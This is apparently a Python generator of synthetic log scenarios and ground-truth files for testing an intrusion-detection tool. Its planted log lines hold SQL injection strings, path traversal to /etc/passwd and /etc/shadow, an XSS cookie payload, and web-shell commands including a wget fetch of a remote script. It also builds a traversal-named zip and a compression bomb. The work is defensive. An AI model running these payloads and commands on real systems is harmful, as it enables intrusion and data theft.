"""Deterministic synthetic log scenarios with planted activity and ground truth.

Usage: python generate.py OUTPUT_DIR [--seed N]

Each scenario directory holds log files and ground_truth.json describing the
files (expected format, hints to use at upload) and the activity planted in
them: what detections should find, and benign look-alikes they should not
flag. Only the standard library is used. All addresses are from documentation
ranges (RFC 5737 / RFC 3849) or private ranges.
"""

from __future__ import annotations

import argparse
import gzip
import io
import json
import random
import zipfile
from collections.abc import Callable
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from xml.sax.saxutils import escape

YEAR = 2026
ATTACKER_SSH = "203.0.113.66"
SCANNER = "198.51.100.23"
WEB_ATTACKER = "192.0.2.44"
SPRAYER = "198.51.100.77"


def bsd(ts: datetime) -> str:
    return f"{ts:%b} {ts.day:2d} {ts:%H:%M:%S}"


class Log:
    """Lines with timestamps, written in time order."""

    def __init__(self) -> None:
        self.entries: list[tuple[datetime, int, str]] = []

    def add(self, ts: datetime, line: str) -> None:
        self.entries.append((ts, len(self.entries), line))

    def text(self) -> str:
        return "".join(line + "\n" for _, _, line in sorted(self.entries))


def linux_intrusion(rng: random.Random, out: Path) -> dict[str, Any]:
    start = datetime(YEAR, 10, 27, 8, 0, tzinfo=UTC)
    auth = Log()
    kern = Log()
    pid = iter(range(2000, 99999))

    # Background: cron, legitimate admin activity, a monitoring account with a stale password.
    for minute in range(0, 24 * 60, 5):
        ts = start + timedelta(minutes=minute)
        auth.add(ts, f"{bsd(ts)} srv01 CRON[{next(pid)}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
    for day_minute in (35, 290, 610, 900):
        ts = start + timedelta(minutes=day_minute)
        p = next(pid)
        ip = f"10.0.0.{rng.randint(10, 30)}"
        auth.add(ts, f"{bsd(ts)} srv01 sshd[{p}]: Accepted publickey for alice from {ip} port {rng.randint(40000, 60000)} ssh2: ED25519 SHA256:aliceKey")
        auth.add(ts + timedelta(seconds=1), f"{bsd(ts)} srv01 sshd[{p}]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)")
        auth.add(ts + timedelta(minutes=2), f"{bsd(ts + timedelta(minutes=2))} srv01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx")
    for minute in range(0, 24 * 60, 10):
        ts = start + timedelta(minutes=minute, seconds=7)
        auth.add(ts, f"{bsd(ts)} srv01 sshd[{next(pid)}]: Failed password for nagios from 10.0.0.50 port {rng.randint(40000, 60000)} ssh2")

    # Planted: brute force from one IP, then a success, privilege use and persistence.
    attack = start + timedelta(hours=13, minutes=2)
    users = ["root", "admin", "oracle", "test", "deploy", "ubuntu", "postgres", "git"]
    for i in range(48):
        ts = attack + timedelta(seconds=i * 3)
        user = users[i % len(users)]
        invalid = "invalid user " if user in ("admin", "oracle", "test", "postgres") else ""
        p = next(pid)
        if invalid:
            auth.add(ts, f"{bsd(ts)} srv01 sshd[{p}]: Invalid user {user} from {ATTACKER_SSH} port {50000 + i}")
        auth.add(ts, f"{bsd(ts)} srv01 sshd[{p}]: Failed password for {invalid}{user} from {ATTACKER_SSH} port {50000 + i} ssh2")
    success = attack + timedelta(minutes=3, seconds=10)
    sp = next(pid)
    auth.add(success, f"{bsd(success)} srv01 sshd[{sp}]: Accepted password for deploy from {ATTACKER_SSH} port 50999 ssh2")
    auth.add(success, f"{bsd(success)} srv01 sshd[{sp}]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)")
    t = success + timedelta(minutes=1)
    auth.add(t, f"{bsd(t)} srv01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash")
    t += timedelta(seconds=40)
    auth.add(t, f"{bsd(t)} srv01 useradd[{next(pid)}]: new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor, shell=/bin/bash, from=/dev/pts/1")
    t += timedelta(seconds=5)
    auth.add(t, f"{bsd(t)} srv01 usermod[{next(pid)}]: add 'backdoor' to group 'sudo'")
    t += timedelta(seconds=30)
    auth.add(t, f"{bsd(t)} srv01 crontab[{next(pid)}]: (root) REPLACE (root)")
    t += timedelta(minutes=20)
    auth.add(t, f"{bsd(t)} srv01 sshd[{sp}]: pam_unix(sshd:session): session closed for user deploy")

    # Planted: port scan against the host, blocked by UFW.
    scan = start + timedelta(hours=12, minutes=40)
    for i, port in enumerate(rng.sample(range(1, 1024), 120)):
        ts = scan + timedelta(milliseconds=150 * i)
        kern.add(ts, f"{bsd(ts)} srv01 kernel: [{43000 + i * 0.15:.3f}] [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:aa:bb:cc SRC={SCANNER} DST=10.0.0.5 LEN=44 TOS=0x00 PREC=0x00 TTL=52 ID={rng.randint(1, 65535)} PROTO=TCP SPT=61000 DPT={port} WINDOW=1024 RES=0x00 SYN URGP=0")
    for i in range(30):
        ts = start + timedelta(minutes=i * 45)
        kern.add(ts, f"{bsd(ts)} srv01 kernel: [{i * 2700}.000] [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.{rng.randint(100, 200)} DST=10.0.0.5 LEN=40 PROTO=TCP SPT={rng.randint(1024, 65535)} DPT=23 WINDOW=1024 SYN URGP=0")

    (out / "auth.log").write_text(auth.text())
    (out / "kern.log").write_text(kern.text())
    hints = {"timezone_hint": "UTC", "year_hint": YEAR}
    return {
        "description": "SSH brute force leading to a successful logon, sudo, a new account "
        "added to sudo and a crontab change; a port scan blocked by the host firewall.",
        "files": [
            {"path": "auth.log", "expected_format": "linux_syslog", "hints": hints},
            {"path": "kern.log", "expected_format": "linux_syslog", "hints": hints},
        ],
        "planted": [
            {"rule_id": "AUTH-001", "entities": {"source_ip": ATTACKER_SSH, "hostname": "srv01"}},
            {"rule_id": "AUTH-003", "entities": {"source_ip": ATTACKER_SSH, "username": "deploy"}},
            {"rule_id": "AUTH-006", "entities": {"source_ip": ATTACKER_SSH}},
            {"rule_id": "PERS-001", "entities": {"username": "backdoor"}},
            {"rule_id": "PRIV-003", "entities": {"username": "backdoor", "group": "sudo"}},
            {"rule_id": "PERS-004", "entities": {"username": "root"}},
            {"rule_id": "CORR-002", "entities": {"hostname": "srv01"}},
            {"rule_id": "NET-001", "entities": {"source_ip": SCANNER}},
            {"rule_id": "NET-002", "entities": {"source_ip": SCANNER}},
        ],
        "benign_lookalikes": [
            {"description": "The brute force tries only 8 account names, below the spraying "
             "threshold; it is a brute force, not password spraying",
             "must_not_match": {"rule_id": "AUTH-002", "source_ip": ATTACKER_SSH}},
            {"description": "Monitoring account nagios fails once every 10 minutes from 10.0.0.50",
             "must_not_match": {"rule_id": "AUTH-001", "source_ip": "10.0.0.50"}},
            {"description": "alice uses sudo for routine service checks",
             "must_not_match": {"rule_id": "PRIV-001", "username": "alice"}},
        ],
        "counts": {"auth.log:logon_failed": 48 + 144, "kern.log:connection_denied": 150},
    }


WEB_PATHS = ["/", "/index.html", "/about", "/products", "/static/app.js", "/static/site.css",
             "/login", "/api/items?page=2", "/contact"]
BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
]


def web_intrusion(rng: random.Random, out: Path) -> dict[str, Any]:
    start = datetime(YEAR, 10, 28, 6, 0, tzinfo=UTC)
    access = Log()
    auth = Log()

    def request(ts: datetime, ip: str, method: str, path: str, status: int, ua: str, size: int | None = None) -> None:
        stamp = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
        access.add(ts, f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} {size if size is not None else rng.randint(200, 20000)} "-" "{ua}"')

    for i in range(1500):
        ts = start + timedelta(seconds=rng.randint(0, 16 * 3600))
        request(ts, f"10.1.{rng.randint(0, 3)}.{rng.randint(2, 250)}", "GET", rng.choice(WEB_PATHS),
                rng.choice([200] * 18 + [304, 404]), rng.choice(BROWSERS))
    scan = start + timedelta(hours=9)
    probes = ["/admin", "/wp-login.php", "/.env", "/.git/config", "/phpmyadmin/", "/backup.zip",
              "/config.php.bak", "/server-status", "/cgi-bin/test.cgi", "/uploads/"]
    for i in range(160):
        ts = scan + timedelta(seconds=i)
        request(ts, WEB_ATTACKER, "GET", f"{rng.choice(probes)}{'' if i % 3 else str(i)}", 404,
                "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)", 0)
    sqli = ["/products?id=1%27%20OR%20%271%27=%271", "/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
            "/api/items?sort=name;DROP%20TABLE%20users", "/products?id=1%27%20AND%20SLEEP(5)--"]
    for i, path in enumerate(sqli * 3):
        request(scan + timedelta(minutes=5, seconds=i * 4), WEB_ATTACKER, "GET", path, 500 if i % 4 == 1 else 200, "sqlmap/1.8.2#stable (https://sqlmap.org)")
    for i, path in enumerate(["/download?file=../../../../etc/passwd", "/download?file=..%2f..%2f..%2fetc%2fshadow"]):
        request(scan + timedelta(minutes=8, seconds=i), WEB_ATTACKER, "GET", path, 200, BROWSERS[0])
    request(scan + timedelta(minutes=9), WEB_ATTACKER, "GET", "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", 200, BROWSERS[0])
    shell = scan + timedelta(minutes=12)
    request(shell, WEB_ATTACKER, "POST", "/uploads/avatar.php", 200, BROWSERS[0])
    for i, cmd in enumerate(["id", "uname%20-a", "cat%20/etc/passwd", "wget%20http://203.0.113.200/x.sh"]):
        request(shell + timedelta(seconds=20 + i * 15), WEB_ATTACKER, "GET", f"/uploads/avatar.php?cmd={cmd}", 200, BROWSERS[0])
    # Benign look-alike: an authorized scanner run with a known UA, from the internal range.
    for i in range(30):
        request(start + timedelta(hours=2, seconds=i * 2), "10.1.9.9", "GET", rng.choice(probes), 404, "Qualys-Internal-Scan/1.0")

    login = shell + timedelta(minutes=6)
    auth.add(login, f"{bsd(login)} web01 sshd[4242]: Accepted password for www-admin from {WEB_ATTACKER} port 51122 ssh2")
    auth.add(login, f"{bsd(login)} web01 sshd[4242]: pam_unix(sshd:session): session opened for user www-admin(uid=1002) by (uid=0)")

    (out / "access.log").write_text(access.text())
    # Fixed mtime and name keep the output byte-for-byte reproducible.
    with (out / "auth.log.1.gz").open("wb") as raw_file, gzip.GzipFile(
        filename="auth.log.1", mode="wb", fileobj=raw_file, mtime=0
    ) as handle:
        handle.write(auth.text().encode())
    hints = {"timezone_hint": "UTC", "year_hint": YEAR}
    return {
        "description": "Web content discovery and injection attempts, a web shell receiving "
        "commands, then an SSH logon from the same address.",
        "files": [
            {"path": "access.log", "expected_format": "web_access", "hints": {}},
            {"path": "auth.log.1.gz", "expected_format": "linux_syslog",
             "archive_member": "auth.log.1", "hints": hints},
        ],
        "planted": [
            {"rule_id": "WEB-001", "entities": {"source_ip": WEB_ATTACKER}},
            {"rule_id": "WEB-002", "entities": {"source_ip": WEB_ATTACKER}},
            {"rule_id": "WEB-003", "entities": {"source_ip": WEB_ATTACKER}},
            {"rule_id": "WEB-004", "entities": {"source_ip": WEB_ATTACKER}},
            {"rule_id": "WEB-005", "entities": {"source_ip": WEB_ATTACKER}},
            {"rule_id": "WEB-006", "entities": {"source_ip": WEB_ATTACKER}},
            {"rule_id": "WEB-007", "entities": {"source_ip": WEB_ATTACKER}},
            {"rule_id": "CORR-001", "entities": {"source_ip": WEB_ATTACKER, "username": "www-admin"}},
        ],
        "benign_lookalikes": [
            {"description": "Authorized internal scanner 10.1.9.9 produces a short 404 burst",
             "note": "May legitimately match WEB-006 at low severity; must not be High."},
        ],
        "counts": {"access.log:http_request": 1500 + 160 + 12 + 2 + 1 + 5 + 30},
    }


def _win_event(eid: int, ts: datetime, record: int, computer: str, data: dict[str, str],
               provider: str = "Microsoft-Windows-Security-Auditing", channel: str = "Security") -> str:
    fields = "".join(f'<Data Name="{k}">{escape(v)}</Data>' for k, v in data.items())
    stamp = ts.strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z"
    return (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
        f'<Provider Name="{provider}"/><EventID>{eid}</EventID><Version>0</Version><Level>0</Level>'
        f'<TimeCreated SystemTime="{stamp}"/><EventRecordID>{record}</EventRecordID>'
        f'<Execution ProcessID="636" ThreadID="1100"/><Channel>{channel}</Channel>'
        f"<Computer>{computer}</Computer><Security/></System><EventData>{fields}</EventData></Event>"
    )


def windows_spray(rng: random.Random, out: Path) -> dict[str, Any]:
    start = datetime(YEAR, 10, 26, 7, 0, tzinfo=UTC)
    host = "DC01.corp.example"
    events: list[tuple[datetime, int, str]] = []
    record = iter(range(10000, 99999))

    def add(eid: int, ts: datetime, data: dict[str, str], **kw: str) -> None:
        events.append((ts, eid, _win_event(eid, ts, next(record), host, data, **kw)))

    def logon(ts: datetime, user: str, logon_type: str, ip: str, logon_id: str) -> None:
        add(4624, ts, {"SubjectUserSid": "S-1-5-18", "SubjectUserName": "DC01$", "SubjectDomainName": "CORP",
                       "SubjectLogonId": "0x3e7", "TargetUserSid": f"S-1-5-21-1-{rng.randint(1000, 9999)}",
                       "TargetUserName": user, "TargetDomainName": "CORP", "TargetLogonId": logon_id,
                       "LogonType": logon_type, "LogonProcessName": "User32", "WorkstationName": "WS",
                       "ProcessName": "C:\\Windows\\System32\\svchost.exe", "IpAddress": ip, "IpPort": str(rng.randint(49152, 65535))})

    for i in range(40):
        ts = start + timedelta(minutes=rng.randint(0, 10 * 60))
        logon(ts, rng.choice(["jdoe", "asmith", "bwong"]), "2", "-", f"0x{rng.randint(0x10000, 0xfffff):x}")
    users = ["administrator", "jdoe", "asmith", "bwong", "svc_backup", "svc_sql", "helpdesk", "guest",
             "kmiller", "lchen", "operator", "scanner", "test", "user1", "itadmin"]
    spray = start + timedelta(hours=11)
    for i, user in enumerate(users * 2):
        ts = spray + timedelta(seconds=i * 7)
        add(4625, ts, {"SubjectUserSid": "S-1-0-0", "SubjectUserName": "-", "SubjectDomainName": "-",
                       "SubjectLogonId": "0x0", "TargetUserSid": "S-1-0-0", "TargetUserName": user,
                       "TargetDomainName": "CORP", "Status": "0xc000006d", "FailureReason": "%%2313",
                       "SubStatus": "0xc000006a", "LogonType": "3", "WorkstationName": "-",
                       "ProcessName": "-", "IpAddress": SPRAYER, "IpPort": "0"})
    hit = spray + timedelta(minutes=6)
    logon(hit, "svc_backup", "10", SPRAYER, "0x8a3f21")
    add(4672, hit, {"SubjectUserSid": "S-1-5-21-1-5001", "SubjectUserName": "svc_backup",
                    "SubjectDomainName": "CORP", "SubjectLogonId": "0x8a3f21",
                    "PrivilegeList": "SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege"})
    t = hit + timedelta(minutes=3)
    add(7045, t, {"ServiceName": "WinUpdateHelper", "ImagePath": "C:\\ProgramData\\wuh.exe",
                  "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem"},
        provider="Service Control Manager", channel="System")
    t += timedelta(minutes=1)
    add(4698, t, {"SubjectUserSid": "S-1-5-21-1-5001", "SubjectUserName": "svc_backup", "SubjectDomainName": "CORP",
                  "SubjectLogonId": "0x8a3f21", "TaskName": "\\Microsoft\\Windows\\UpdateCheck",
                  "TaskContent": "<Task><Actions><Exec><Command>C:\\ProgramData\\wuh.exe</Command></Exec></Actions></Task>"})
    t += timedelta(minutes=1)
    add(4720, t, {"TargetUserName": "helpdesk2", "TargetDomainName": "CORP", "TargetSid": "S-1-5-21-1-7777",
                  "SubjectUserSid": "S-1-5-21-1-5001", "SubjectUserName": "svc_backup",
                  "SubjectDomainName": "CORP", "SubjectLogonId": "0x8a3f21"})
    t += timedelta(seconds=20)
    add(4732, t, {"MemberName": "-", "MemberSid": "S-1-5-21-1-7777", "TargetUserName": "Administrators",
                  "TargetDomainName": "Builtin", "TargetSid": "S-1-5-32-544",
                  "SubjectUserSid": "S-1-5-21-1-5001", "SubjectUserName": "svc_backup",
                  "SubjectDomainName": "CORP", "SubjectLogonId": "0x8a3f21"})
    t += timedelta(minutes=10)
    cleared = _win_event(1102, t, next(record), host, {}, provider="Microsoft-Windows-Eventlog")
    cleared = cleared.replace(
        "<EventData></EventData>",
        '<UserData><LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">'
        "<SubjectUserSid>S-1-5-21-1-5001</SubjectUserSid><SubjectUserName>svc_backup</SubjectUserName>"
        "<SubjectDomainName>CORP</SubjectDomainName><SubjectLogonId>0x8a3f21</SubjectLogonId>"
        "</LogFileCleared></UserData>",
    )
    events.append((t, 1102, cleared))

    body = "<Events>\r\n" + "\r\n".join(xml for _, _, xml in sorted(events)) + "\r\n</Events>\r\n"
    # Windows tools commonly write UTF-16 LE with a BOM.
    (out / "Security-export.xml").write_bytes(b"\xff\xfe" + body.encode("utf-16-le"))
    return {
        "description": "Password spraying against many accounts, a remote interactive logon to "
        "a service account from the same address, then a service install, scheduled task, new "
        "account added to Administrators and the Security log cleared.",
        "files": [{"path": "Security-export.xml", "expected_format": "windows_evtx_xml", "hints": {}}],
        "planted": [
            {"rule_id": "AUTH-002", "entities": {"source_ip": SPRAYER}},
            {"rule_id": "AUTH-004", "entities": {"source_ip": SPRAYER}},
            {"rule_id": "AUTH-003", "entities": {"source_ip": SPRAYER, "username": "svc_backup"}},
            {"rule_id": "AUTH-008", "entities": {"source_ip": SPRAYER, "username": "svc_backup"}},
            {"rule_id": "PERS-002", "entities": {"service_name": "WinUpdateHelper"}},
            {"rule_id": "PERS-003", "entities": {"task_name": "\\Microsoft\\Windows\\UpdateCheck"}},
            {"rule_id": "PERS-001", "entities": {"username": "helpdesk2"}},
            {"rule_id": "PRIV-003", "entities": {"group_name": "Administrators"}},
            {"rule_id": "DEF-001", "entities": {"username": "svc_backup"}},
            {"rule_id": "CORR-002", "entities": {"hostname": host}},
        ],
        "benign_lookalikes": [
            *(
                {"description": f"Interactive console logons (type 2) by {user}",
                 "must_not_match": {"rule_id": "AUTH-008", "username": user}}
                for user in ("jdoe", "asmith", "bwong")
            ),
        ],
        "counts": {"Security-export.xml:logon_failed": 30, "Security-export.xml:logon": 41},
    }


def network_scan(rng: random.Random, out: Path) -> dict[str, Any]:
    start = datetime(YEAR, 10, 29, 1, 0, tzinfo=UTC)
    rows: list[tuple[float, str]] = []
    for i in range(400):
        ts = start + timedelta(seconds=rng.randint(0, 6 * 3600), microseconds=rng.randint(0, 999999))
        rows.append((ts.timestamp(), "\t".join([
            f"{ts.timestamp():.6f}", f"C{rng.getrandbits(60):x}", f"10.0.0.{rng.randint(10, 60)}",
            str(rng.randint(40000, 65000)), rng.choice(["93.184.216.34", "10.0.0.5", "10.0.0.1"]),
            rng.choice(["443", "80", "53"]), rng.choice(["tcp", "udp"]), "SF", rng.choice(["ssl", "http", "dns"]),
            f"{rng.random() * 3:.6f}", str(rng.randint(100, 5000)), str(rng.randint(100, 90000)), "ShADadFf"])))
    scan = start + timedelta(hours=2)
    for i in range(250):
        ts = scan + timedelta(milliseconds=40 * i)
        rows.append((ts.timestamp(), "\t".join([
            f"{ts.timestamp():.6f}", f"C{rng.getrandbits(60):x}", SCANNER, "61000", "10.0.0.5",
            str(i + 1), "tcp", "REJ", "-", "0.000100", "0", "0", "Sr"])))
    header = (
        "#separator \\x09\n#set_separator\t,\n#empty_field\t(empty)\n#unset_field\t-\n#path\tconn\n"
        f"#open\t{start:%Y-%m-%d-%H-%M-%S}\n"
        "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tconn_state\tservice\t"
        "duration\torig_bytes\tresp_bytes\thistory\n"
        "#types\ttime\tstring\taddr\tport\taddr\tport\tenum\tstring\tstring\tinterval\tcount\tcount\tstring\n"
    )
    body = "".join(line + "\n" for _, line in sorted(rows))
    (out / "conn.log").write_text(header + body + f"#close\t{start + timedelta(hours=6):%Y-%m-%d-%H-%M-%S}\n")
    return {
        "description": "A TCP port scan of one host seen by Zeek (rejected connections to 250 ports).",
        "files": [{"path": "conn.log", "expected_format": "zeek_tsv", "hints": {}}],
        "planted": [{"rule_id": "NET-001", "entities": {"source_ip": SCANNER, "destination_ip": "10.0.0.5"}}],
        "benign_lookalikes": [],
        "counts": {"conn.log:network_connection": 650},
    }


def hostile_inputs(rng: random.Random, out: Path) -> dict[str, Any]:
    """Inputs that try to break the tool, not the target system."""
    ts = datetime(YEAR, 10, 29, 3, 0, tzinfo=UTC)
    lines = [
        f"{bsd(ts)} h1 sshd[1]: Failed password for <script>alert(1)</script> from 203.0.113.9 port 1 ssh2",
        f"{bsd(ts)} h1 app[2]: =HYPERLINK(\"http://203.0.113.9\",\"click\") formula in a log",
        f"{bsd(ts)} h1 app[3]: " + "A" * (2 * 1024 * 1024),
        f"{bsd(ts)} h1 app[4]: message with a NUL\x00inside",
    ]
    raw = "\n".join(lines).encode() + b"\n" + f"{bsd(ts)} h1 app[5]: invalid utf-8 ".encode() + b"\xff\xfe\xc3\x28\n"
    (out / "hostile.log").write_bytes(raw)

    buffer = io.BytesIO()
    members: list[tuple[str, bytes]] = [
        ("logs/ok.log", f"{bsd(ts)} h1 app[6]: inside the archive\n".encode()),
        ("../../../../tmp/evil.log", b"traversal attempt\n"),
        ("/etc/cron.d/evil", b"absolute path\n"),
        ("bomb.log", b"\x00" * (32 * 1024 * 1024)),
    ]
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, content in members:
            info = zipfile.ZipInfo(name, date_time=(YEAR, 10, 29, 3, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            archive.writestr(info, content)
    (out / "evidence.zip").write_bytes(buffer.getvalue())

    csv_rows = [
        "Level,Date and Time,Source,Event ID,Task Category",
        'Information,11/1/2026 1:30:00 AM,Microsoft-Windows-Security-Auditing,4624,Logon,"Ambiguous (DST fall-back)"',
        'Information,3/8/2026 2:30:00 AM,Microsoft-Windows-Security-Auditing,4624,Logon,"Nonexistent (DST spring-forward)"',
        'Information,10/29/2026 9:00:00 AM,Microsoft-Windows-Security-Auditing,4624,Logon,"Normal"',
    ]
    (out / "eventviewer.csv").write_bytes(b"\xef\xbb\xbf" + "\r\n".join(csv_rows).encode() + b"\r\n")
    return {
        "description": "Hostile content: markup and spreadsheet formulas in fields, an overlong "
        "line, NUL and invalid UTF-8, an archive with traversal names and a compression bomb, "
        "and local times that are ambiguous or nonexistent under DST.",
        "files": [
            {"path": "hostile.log", "expected_format": "linux_syslog", "hints": {"timezone_hint": "UTC", "year_hint": YEAR}},
            {"path": "evidence.zip", "expected_format": None, "expected_member_problems": [
                "ARCHIVE_PATH_TRAVERSAL", "ARCHIVE_PATH_TRAVERSAL", "ARCHIVE_BOMB_SUSPECTED"]},
            {"path": "eventviewer.csv", "expected_format": "windows_evtx_csv",
             "hints": {"timezone_hint": "America/New_York"},
             "expected_warnings": ["dst_ambiguous", "dst_nonexistent"]},
        ],
        "planted": [],
        "benign_lookalikes": [],
        "counts": {},
    }


SCENARIOS: dict[str, Callable[[random.Random, Path], dict[str, Any]]] = {
    "linux_intrusion": linux_intrusion,
    "web_intrusion": web_intrusion,
    "windows_spray": windows_spray,
    "network_scan": network_scan,
    "hostile_inputs": hostile_inputs,
}


def generate(output: Path, seed: int = 20261029) -> list[str]:
    output.mkdir(parents=True, exist_ok=True)
    for name, build in SCENARIOS.items():
        directory = output / name
        directory.mkdir(exist_ok=True)
        truth = build(random.Random(f"{seed}:{name}"), directory)
        truth = {"scenario": name, "seed": seed, "generator_version": "1.1.0", **truth}
        (directory / "ground_truth.json").write_text(json.dumps(truth, indent=2) + "\n")
    return list(SCENARIOS)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("output", type=Path)
    parser.add_argument("--seed", type=int, default=20261029)
    args = parser.parse_args()
    for name in generate(args.output, args.seed):
        print(f"wrote {args.output / name}")


if __name__ == "__main__":
    main()
